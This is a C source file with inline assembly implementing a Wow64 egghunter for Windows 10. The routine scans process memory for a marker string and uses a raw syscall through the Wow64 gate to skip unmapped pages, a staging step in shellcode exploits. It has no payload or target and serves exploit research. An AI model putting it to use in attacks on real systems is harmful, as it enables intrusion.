/*****************************************************************************
*
*  PROJECT:     Wow64 Egghunter
*  FILE:        main.c
*  ABSTRACT:	Egghunter for Wow64/Windows 10
*  DEVELOPERS:  Ayoub Chouak <a.chouak@protonmail.com>
*
*  WEBSITE:		http://chouak.me/
*
*****************************************************************************/

#include <Windows.h>
#include <stdio.h>

#include "structs.h"

#pragma comment(lib, "ntdll.lib")

#define DECLSPEC_NAKED __declspec(naked)

/********************* Globals */
char g_szEgg[] = "BEEFBEEF";

/********************* Protos */
NTSYSAPI
NTSTATUS
NTAPI
NtAccessCheckAndAuditAlarm(
	IN PUNICODE_STRING      SubsystemName OPTIONAL,
	IN HANDLE               ObjectHandle OPTIONAL,
	IN PUNICODE_STRING      ObjectTypeName OPTIONAL,
	IN PUNICODE_STRING      ObjectName OPTIONAL,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor,
	IN ACCESS_MASK          DesiredAccess,
	IN PGENERIC_MAPPING     GenericMapping,
	IN BOOLEAN              ObjectCreation,
	OUT PULONG              GrantedAccess,
	OUT PULONG              AccessStatus,
	OUT PBOOLEAN            GenerateOnClose
);

DECLSPEC_NAKED
FORCEINLINE
VOID RetnStub()
{
	__asm retn;
}

__declspec(naked) 
PVOID Wow64EggHuntEntry()
/*++
	Routine Description:
		Scans the flat memory space for an egg signature
	Returns:
		The egg starting address
--*/
{
	__prolog__:
		__asm push ebp;
		__asm mov ebp, esp;

	next_page:
		__asm or edx, 0xfff;
	next_byte :
		__asm add edx, 1;
	call_ntaccess_check:
		__asm push edx;

		__asm sub esp, 0x2c;
		__asm mov eax, 0;
		__asm mov ecx, 0xb;
		__asm mov edi, esp
		__asm rep stos dword ptr es:[edi];
		__asm call offset ntaccess_check_thunk;

		__asm pop edx;

		__asm jmp pinpoint_egg;
	ntaccess_check_thunk:
		__asm mov eax, 0x29
		__asm call offset wow64_thunk;
		__asm retn 0x2c;
	pinpoint_egg:
		__asm cmp al, 0x5;
		__asm je next_page;
		__asm mov eax, 0x46454542;
		__asm mov edi, edx;
		__asm scasd; // First hit
		__asm jne next_byte;
		__asm scasd; // Second hit
		__asm jne next_byte;
		__asm jmp offset __epilog__;
	wow64_thunk:
		__asm mov eax, 0x29;
		__asm jmp fs:[0xc0];

	__epilog__:
		__asm mov eax, edi;
		__asm pop ebp;
		__asm ret;
}

VOID
CALLBACK
MyThreadStartRoutine(VOID)
{
	PVOID ptrEgg = Wow64EggHuntEntry();
	printf_s("[+] Egg found at 0x%08p", ptrEgg);
}

int main(int argc, char** argv)
{
	DWORD  ClientId;
	HANDLE hThread;

	hThread = CreateThread(NULL, 0x10000, MyThreadStartRoutine, NULL, 0, &ClientId);

	if (hThread == INVALID_HANDLE_VALUE)
		return -1;
	WaitForSingleObject(hThread, INFINITE);

	getchar();
}